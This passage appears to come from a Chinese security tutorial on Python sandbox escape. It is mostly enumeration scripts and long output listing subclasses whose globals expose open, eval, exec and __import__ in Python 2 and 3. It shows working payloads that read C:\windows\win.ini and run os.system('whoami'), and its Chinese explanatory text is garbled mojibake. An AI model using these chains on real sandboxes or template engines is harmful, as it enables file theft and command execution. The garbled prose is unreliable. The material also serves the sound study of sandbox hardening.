= target_modules + target_functions results = defaultdict(list) for m in modules: try: module = __import__(m) except Exception as e: # print('ERROR:', m) pass for t in all_targets: if t in module.__dict__: results[m.encode()].append(t) print(\"å¯åˆ©ç”¨æ¨¡å—æ•°é‡ä¸º:\"+str(len(results))) for k, v in results.items(): print(k, v) ç­›é€‰å®Œæˆåæœ‰python3ä¸¤ç™¾ä¸ªæ¨¡å—å¯èƒ½å¯ä»¥åˆ©ç”¨ï¼Œç„¶åå†åˆ©ç”¨è„šæœ¬è¿›ä¸€æ­¥ç­›é€‰ find_modules = { } target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys'] target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open'] all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions)) all_modules = list(set(list(find_modules.keys()) + target_modules)) subclasses = ().__class__.__bases__[0].__subclasses__() sub_name = [s.__name__ for s in subclasses] # ç¬¬ä¸€ç§éå†,å¦‚:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read() print('----------1-----------') for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target) print('----------2-----------') # ç¬¬äºŒç§éå†,å¦‚:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls') for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__ for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: pass print('----------3-----------') # ç¬¬ä¸‰ç§éå†,å¦‚:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__(\"os\").system(\"ls\")') for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: pass print('----------4-----------') # ç¬¬å››ç§éå†:å¦‚:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\") # &lt;class 'warnings.catch_warnings'&gt;ç±»å¾ˆç‰¹æ®Šï¼Œåœ¨å†…éƒ¨å®šä¹‰äº†_module=sys.modules['warnings']ï¼Œç„¶åwarningsæ¨¡å—åŒ…å«æœ‰__builtins__ï¼Œä¸å…·æœ‰é€šç”¨æ€§ï¼Œæœ¬è´¨ä¸Šè·Ÿç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass ----------2----------- 75 &lt;class '_frozen_importlib._ModuleLock'&gt; __builtins__ None 75 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ None 75 &lt;class '_frozen_importlib._ModuleLock'&gt; sys None 76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __builtins__ None 76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ None 76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; sys None 77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __builtins__ None 77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ None 77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; sys None 78 &lt;class '_frozen_importlib._installed_safely'&gt; __builtins__ None 78 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ None 78 &lt;class '_frozen_importlib._installed_safely'&gt; sys None 79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __builtins__ None 79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ None 79 &lt;class '_frozen_importlib.ModuleSpec'&gt; sys None 91 &lt;class '_frozen_importlib_external.FileLoader'&gt; __builtins__ None 91 &lt;class '_frozen_importlib_external.FileLoader'&gt; sys None 92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __builtins__ None 92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; sys None 93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __builtins__ None 93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; sys None 95 &lt;class '_frozen_importlib_external.FileFinder'&gt; __builtins__ None 95 &lt;class '_frozen_importlib_external.FileFinder'&gt; sys None 103 &lt;class 'codecs.IncrementalEncoder'&gt; __builtins__ None 103 &lt;class 'codecs.IncrementalEncoder'&gt; sys None 103 &lt;class 'codecs.IncrementalEncoder'&gt; open None 104 &lt;class 'codecs.IncrementalDecoder'&gt; __builtins__ None 104 &lt;class 'codecs.IncrementalDecoder'&gt; sys None 104 &lt;class 'codecs.IncrementalDecoder'&gt; open None 105 &lt;class 'codecs.StreamReaderWriter'&gt; __builtins__ None 105 &lt;class 'codecs.StreamReaderWriter'&gt; sys None 105 &lt;class 'codecs.StreamReaderWriter'&gt; open None 106 &lt;class 'codecs.StreamRecoder'&gt; __builtins__ None 106 &lt;class 'codecs.StreamRecoder'&gt; sys None 106 &lt;class 'codecs.StreamRecoder'&gt; open None 128 &lt;class 'os._wrap_close'&gt; __builtins__ None 128 &lt;class 'os._wrap_close'&gt; sys None 128 &lt;class 'os._wrap_close'&gt; open None 129 &lt;class '_sitebuiltins.Quitter'&gt; __builtins__ None 129 &lt;class '_sitebuiltins.Quitter'&gt; sys None 130 &lt;class '_sitebuiltins._Printer'&gt; __builtins__ None 130 &lt;class '_sitebuiltins._Printer'&gt; sys None 137 &lt;class 'types.DynamicClassAttribute'&gt; __builtins__ None 138 &lt;class 'types._GeneratorWrapper'&gt; __builtins__ None 139 &lt;class 'warnings.WarningMessage'&gt; __builtins__ None 139 &lt;class 'warnings.WarningMessage'&gt; sys None 140 &lt;class 'warnings.catch_warnings'&gt; __builtins__ None 140 &lt;class 'warnings.catch_warnings'&gt; sys None 167 &lt;class 'reprlib.Repr'&gt; __builtins__ None 174 &lt;class 'functools.partialmethod'&gt; __builtins__ None 176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __builtins__ None 176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; sys None 177 &lt;class 'contextlib._BaseExitStack'&gt; __builtins__ None 177 &lt;class 'contextlib._BaseExitStack'&gt; sys None ----------3----------- 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; eval 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; compile 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; eval 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; compile 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; eval 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; compile 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; eval 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; compile 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; eval 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; compile 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; eval 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; compile 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; __import__ 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; eval 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; compile 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __import__ 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; eval 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; compile 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __import__ 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; eval 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; compile 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; __import__ 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; eval 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; compile 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; __import__ 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open 103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; eval 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; compile 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; __import__ 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open 104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; eval 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; compile 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; __import__ 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open 105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; exec 106 7 &lt;class 'codecs.StreamRecoder'&gt; eval 106 7 &lt;class 'codecs.StreamRecoder'&gt; compile 106 7 &lt;class 'codecs.StreamRecoder'&gt; __import__ 106 7 &lt;class 'codecs.StreamRecoder'&gt; open 106 56 &lt;class 'codecs.StreamRecoder'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; exec 128 1 &lt;class 'os._wrap_close'&gt; file 128 1 &lt;class 'os._wrap_close'&gt; open 128 7 &lt;class 'os._wrap_close'&gt; exec 128 7 &lt;class 'os._wrap_close'&gt; eval 128 7 &lt;class 'os._wrap_close'&gt; compile 128 7 &lt;class 'os._wrap_close'&gt; __import__ 128 7 &lt;class 'os._wrap_close'&gt; open 128 11 &lt;class 'os._wrap_close'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec 129 7 &lt;class '_sitebuiltins.Quitter'&gt; eval 129 7 &lt;class '_sitebuiltins.Quitter'&gt; compile 129 7 &lt;class '_sitebuiltins.Quitter'&gt; __import__ 129 7 &lt;class '_sitebuiltins.Quitter'&gt; open 130 7 &lt;class '_sitebuiltins._Printer'&gt; exec 130 7 &lt;class '_sitebuiltins._Printer'&gt; eval 130 7 &lt;class '_sitebuiltins._Printer'&gt; compile 130 7 &lt;class '_sitebuiltins._Printer'&gt; __import__ 130 7 &lt;class '_sitebuiltins._Printer'&gt; open 137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec 137 7 &lt;class 'types.DynamicClassAttribute'&gt; eval 137 7 &lt;class 'types.DynamicClassAttribute'&gt; compile 137 7 &lt;class 'types.DynamicClassAttribute'&gt; __import__ 137 7 &lt;class 'types.DynamicClassAttribute'&gt; open 138 7 &lt;class 'types._GeneratorWrapper'&gt; exec 138 7 &lt;class 'types._GeneratorWrapper'&gt; eval 138 7 &lt;class 'types._GeneratorWrapper'&gt; compile 138 7 &lt;class 'types._GeneratorWrapper'&gt; __import__ 138 7 &lt;class 'types._GeneratorWrapper'&gt; open 139 7 &lt;class 'warnings.WarningMessage'&gt; exec 139 7 &lt;class 'warnings.WarningMessage'&gt; eval 139 7 &lt;class 'warnings.WarningMessage'&gt; compile 139 7 &lt;class 'warnings.WarningMessage'&gt; __import__ 139 7 &lt;class 'warnings.WarningMessage'&gt; open 140 7 &lt;class 'warnings.catch_warnings'&gt; exec 140 7 &lt;class 'warnings.catch_warnings'&gt; eval 140 7 &lt;class 'warnings.catch_warnings'&gt; compile 140 7 &lt;class 'warnings.catch_warnings'&gt; __import__ 140 7 &lt;class 'warnings.catch_warnings'&gt; open 167 7 &lt;class 'reprlib.Repr'&gt; exec 167 7 &lt;class 'reprlib.Repr'&gt; eval 167 7 &lt;class 'reprlib.Repr'&gt; compile 167 7 &lt;class 'reprlib.Repr'&gt; __import__ 167 7 &lt;class 'reprlib.Repr'&gt; open 174 7 &lt;class 'functools.partialmethod'&gt; exec 174 7 &lt;class 'functools.partialmethod'&gt; eval 174 7 &lt;class 'functools.partialmethod'&gt; compile 174 7 &lt;class 'functools.partialmethod'&gt; __import__ 174 7 &lt;class 'functools.partialmethod'&gt; open 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; eval 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; compile 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __import__ 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open 177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec 177 7 &lt;class 'contextlib._BaseExitStack'&gt; eval 177 7 &lt;class 'contextlib._BaseExitStack'&gt; compile 177 7 &lt;class 'contextlib._BaseExitStack'&gt; __import__ 177 7 &lt;class 'contextlib._BaseExitStack'&gt; open ----------4----------- 140 exec 140 eval 140 compile 140 __import__ 140 open ç­›é€‰å‡ºæ¥çš„æ¨¡å—è¿˜æ˜¯å¾ˆå¤šï¼Œæ¯ä¸ªåˆ†å—ä¸­ï¼Œä¸ç”¨çš„éƒ¨åˆ†ä»£è¡¨åˆ©ç”¨ä¸åŒçš„æ–¹å¼ï¼Œä¸ºäº†æ›´æ–¹ä¾¿çš„åˆ©ç”¨è¿›ä¸€æ­¥ç­›é€‰å…·æœ‰æ›´ç›´æ¥åˆ©ç”¨æ–¹å¼çš„ç±»ï¼Œå…³æ³¨å†å‘½ä»¤æ‰§è¡Œå’Œè¯»å†™ä¸Š ----------2----------- 103 &lt;class 'codecs.IncrementalEncoder'&gt; open None 104 &lt;class 'codecs.IncrementalDecoder'&gt; open None 105 &lt;class 'codecs.StreamReaderWriter'&gt; open None 106 &lt;class 'codecs.StreamRecoder'&gt; open None 128 &lt;class 'os._wrap_close'&gt; open None ----------3----------- 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open 93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec 103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec 104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec 105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; exec 106 56 &lt;class 'codecs.StreamRecoder'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; exec 128 7 &lt;class 'os._wrap_close'&gt; open 128 7 &lt;class 'os._wrap_close'&gt; exec 128 11 &lt;class 'os._wrap_close'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec 130 7 &lt;class '_sitebuiltins._Printer'&gt; open 130 7 &lt;class '_sitebuiltins._Printer'&gt; exec 137 7 &lt;class 'types.DynamicClassAttribute'&gt; open 137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec 138 7 &lt;class 'types._GeneratorWrapper'&gt; open 138 7 &lt;class 'types._GeneratorWrapper'&gt; exec 139 7 &lt;class 'warnings.WarningMessage'&gt; open 139 7 &lt;class 'warnings.WarningMessage'&gt; exec 140 7 &lt;class 'warnings.catch_warnings'&gt; open 140 7 &lt;class 'warnings.catch_warnings'&gt; exec 167 7 &lt;class 'reprlib.Repr'&gt; open 167 7 &lt;class 'reprlib.Repr'&gt; exec 174 7 &lt;class 'functools.partialmethod'&gt; open 174 7 &lt;class 'functools.partialmethod'&gt; exec 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec 177 7 &lt;class 'contextlib._BaseExitStack'&gt; open 177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec ----------4----------- 140 open 140 exec æ—¢ç„¶ç­›é€‰å‡ºæ¥ï¼Œé‚£ä¹ˆé€‰å…¶ä¸­ä¸€ä¸ªåˆ©ç”¨æ¥è¯»å–æ–‡ä»¶ï¼š &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[103] &lt;class 'codecs.IncrementalEncoder'&gt; å®Œæ•´æ‰§è¡Œ &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['open'](\"C:\\\\windows\\\\win.ini\").read() '; for 16-bit app support [fonts] [extensions] [mciextensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CM C=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessaging=1 [xianshuabao] client_uuid={xxx} ' æ‰§è¡Œå‘½ä»¤ï¼Œæ­¤å¤„å¦‚æœä½¿ç”¨åŸä½œè€…ç»™çš„ç¬¬ä¸‰ç§åˆ©ç”¨ä»£ç åœ¨python3ä¸­ä¼šæŠ¥é”™ï¼Œpython3ä¸­å¯¹äºdict.valuesä¸å†è¿”å›åˆ—è¡¨ï¼Œè€Œæ˜¯è¿”å›viewï¼Œä¸å¯ç´¢å¼•çš„å¯¹è±¡ã€‚ &gt;&gt;&gt; \"\".__class__.__bases__[0].__subclasses__()[103].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"whoami\")') misaki\\user 5.2 python2 python2.7çš„æ¨¡å—(252) bsddb compiler ctypes curses ...... webbrowser.py whichdb.py wsgiref.egg-info xdrlib.py xmllib.py xmlrpclib.py zipfile.py åŒæ ·åˆ©ç”¨åŸä»£ç è¿›è¡Œç­›é€‰ ----------1----------- (40, 'file') ----------2----------- (59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None) (59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None) (59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, '__builtins__', None) (60, &lt;class 'warnings.catch_warnings'&gt;, 'sys', None) (60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__']) (61, &lt;class '_weakrefset._IterationGuard'&gt;, '__builtins__', None) (62, &lt;class '_weakrefset.WeakSet'&gt;, '__builtins__', None) (72, &lt;class 'site._Printer'&gt;, '__builtins__', None) (72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open']) (72, &lt;class 'site._Printer'&gt;, 'sys', None) (77, &lt;class 'site.Quitter'&gt;, '__builtins__', None) (77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__']) (77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open']) (77, &lt;class 'site.Quitter'&gt;, 'sys', None) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, '__builtins__', None) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'sys', None) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, '__builtins__', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'sys', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None) ----------3----------- (59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, '__import__') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'compile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, '__import__') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'compile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, '__import__') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'compile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile') (72, 20, &lt;class 'site._Printer'&gt;, 'file') (72, 20, &lt;class 'site._Printer'&gt;, 'exec') (72, 23, &lt;class 'site._Printer'&gt;, '__import__') (72, 23, &lt;class 'site._Printer'&gt;, 'file') (72, 23, &lt;class 'site._Printer'&gt;, 'compile') (72, 23, &lt;class 'site._Printer'&gt;, 'eval') (72, 23, &lt;class 'site._Printer'&gt;, 'open') (72, 23, &lt;class 'site._Printer'&gt;, 'execfile') (77, 20, &lt;class 'site.Quitter'&gt;, 'file') (77, 20, &lt;class 'site.Quitter'&gt;, 'exec') (77, 23, &lt;class 'site.Quitter'&gt;, '__import__') (77, 23, &lt;class 'site.Quitter'&gt;, 'file') (77, 23, &lt;class 'site.Quitter'&gt;, 'compile') (77, 23, &lt;class 'site.Quitter'&gt;, 'eval') (77, 23, &lt;class 'site.Quitter'&gt;, 'open') (77, 23, &lt;class 'site.Quitter'&gt;, 'execfile') (78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, '__import__') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'compile') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile') (79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, '__import__') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'compile') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile') ----------4----------- (60, '__import__') (60, 'file') (60, 'repr') (60, 'compile') (60, 'eval') (60, 'open') (60, 'execfile') è¿›ä¸€æ­¥è·å–å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–è€…è¯»å–æ–‡ä»¶çš„ç±» ----------1----------- (40, 'file') ----------2----------- (59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__']) (60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__']) (72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open']) (77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__']) (77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open']) (78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None) (79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None) ----------3----------- (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open') (59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open') (60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open') (61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open') (62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile') (72, 20, &lt;class 'site._Printer'&gt;, 'file') (72, 20, &lt;class 'site._Printer'&gt;, 'exec') (72, 23, &lt;class 'site._Printer'&gt;, 'file') (72, 23, &lt;class 'site._Printer'&gt;, 'eval') (72, 23, &lt;class 'site._Printer'&gt;, 'open') (72, 23, &lt;class 'site._Printer'&gt;, 'execfile') (77, 20, &lt;class 'site.Quitter'&gt;, 'file') (77, 20, &lt;class 'site.Quitter'&gt;, 'exec') (77, 23, &lt;class 'site.Quitter'&gt;, 'file') (77, 23, &lt;class 'site.Quitter'&gt;, 'eval') (77, 23, &lt;class 'site.Quitter'&gt;, 'open') (77, 23, &lt;class 'site.Quitter'&gt;, 'execfile') (78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open') (78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile') (79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open') (79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile') ----------4----------- (60, 'file') (60, 'repr') (60, 'eval') (60, 'open') (60, 'execfile') 